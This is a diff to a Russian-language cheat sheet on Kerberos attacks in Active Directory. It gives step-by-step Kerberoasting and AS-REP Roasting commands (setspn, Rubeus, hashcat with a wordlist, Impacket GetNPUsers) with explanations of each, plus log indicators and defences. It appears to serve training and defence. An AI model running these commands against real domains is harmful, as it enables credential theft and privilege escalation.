@@ -1,28 +1,94 @@
-# Kerberos — атаки на аутентификацию в AD
+# Kerberos Attack
 
 ## 🎯 Цель атаки
-Получить Kerberos Ticket Granting Service (TGS) или Ticket Granting Ticket (TGT) для последующего взлома оффлайн.
+Эксплуатировать слабые места протокола Kerberos для получения доступа к учётным записям и повышения привилегий в домене Active Directory.
 
-## 📋 Техники
-- **Kerberoasting** — запрос TGS для сервисного аккаунта и взлом оффлайн.
-- **AS-REP Roasting** — запрос AS-REP для аккаунта без pre-auth.
-- **Pass-the-Ticket** — использование украденного TGT/TGS.
+## 📋 Описание
+Kerberos — основной протокол аутентификации в AD. Атаки на него включают Kerberoasting, AS-REP Roasting, Pass-the-Ticket и другие техники.  
+Главная цель атакующего — получить TGS или TGT и использовать их для входа в систему без знания пароля в открытом виде.
 
-## 🔹 Пошагово (Kerberoasting)
-1. Запросить TGS для сервисного аккаунта:
-```bash
-GetUserSPNs.py domain.local/user:password
+## ⚠ Условия эксплуатации
+- Доступ к контроллеру домена по портам Kerberos (88/tcp, 88/udp).
+- Учётная запись в домене (для некоторых атак).
+- Уязвимые настройки SPN-аккаунтов (слабые пароли сервисов).
+
+## 🔹 Пошаговое проведение атаки (лаборатория)
+> ⚠ Выполнять только в изолированной тестовой среде!
+
+### Kerberoasting
+1. Получить список сервисных SPN-аккаунтов:
+```powershell
+setspn -Q */*
 ```
-2. Взломать хэш оффлайн:
+2. Запросить TGS для этих SPN (пример с Rubeus):
+```powershell
+Rubeus.exe kerberoast /user:targetuser /rc4 /nowrap
+```
+3. Взломать полученный хэш оффлайн (Hashcat):
 ```bash
-hashcat -m 13100 hash.txt wordlist.txt
+hashcat -m 13100 hashes.txt rockyou.txt
 ```
 
-## 📊 SIEM
-- Event ID 4769 — Kerberos service ticket request.
-- Необычное количество запросов TGS.
+### AS-REP Roasting
+1. Найти учётки с флагом "Do not require Kerberos preauthentication":
+```powershell
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties ServicePrincipalName
+```
+2. Получить AS-REP ответ:
+```bash
+GetNPUsers.py domain.local/user -dc-ip 192.168.1.10
+```
 
-## 🛡 Защита
-- Сложные пароли для сервисных аккаунтов.
-- Запрет DES/RC4.
-- Мониторинг 4769 на массовые запросы.
+## 📊 Признаки в логах и мониторинг
+- Event ID **4769** — выдача TGS (особенно множественные для разных сервисов).
+- Event ID **4624** с LogonType=3/9 от необычных хостов.
+- Частые ошибки Kerberos-аутентификации.
+
+## 🛡 Меры защиты
+- Сложные пароли для SPN-аккаунтов.
+- Убрать флаг "DoesNotRequirePreAuth".
+- Ограничить права учёток.
+- Мониторить события 4769, 4624, 4771.
+
+## 🔗 Источники
+- [MITRE ATT&CK: T1558](https://attack.mitre.org/techniques/T1558/)
+- [Kerberos Attacks and Defense](https://adsecurity.org/)
+
+---
+
+## 🔍 Разбор команд
+
+### 1. Получение списка SPN
+```powershell
+setspn -Q */*
+```
+- **`setspn`** — утилита Windows для работы с SPN.
+- **`-Q */*`** — запрос всех сервисных SPN в домене.
+
+### 2. Kerberoasting с Rubeus
+```powershell
+Rubeus.exe kerberoast /user:targetuser /rc4 /nowrap
+```
+- **`kerberoast`** — модуль Rubeus для запроса TGS и получения их в хэш-формате.
+- **`/rc4`** — тип шифрования RC4.
+- **`/nowrap`** — вывод без переноса строк.
+
+### 3. Взлом хэшей Hashcat
+```bash
+hashcat -m 13100 hashes.txt rockyou.txt
+```
+- **`-m 13100`** — Kerberos 5 TGS-REP etype 23.
+- **`hashes.txt`** — файл с хэшами.
+- **`rockyou.txt`** — словарь.
+
+### 4. Поиск учёток без preauth
+```powershell
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties ServicePrincipalName
+```
+- Находит аккаунты, у которых отключена Kerberos-предаутентификация.
+
+### 5. Получение AS-REP
+```bash
+GetNPUsers.py domain.local/user -dc-ip 192.168.1.10
+```
+- Скрипт из Impacket для получения AS-REP у уязвимых учёток.
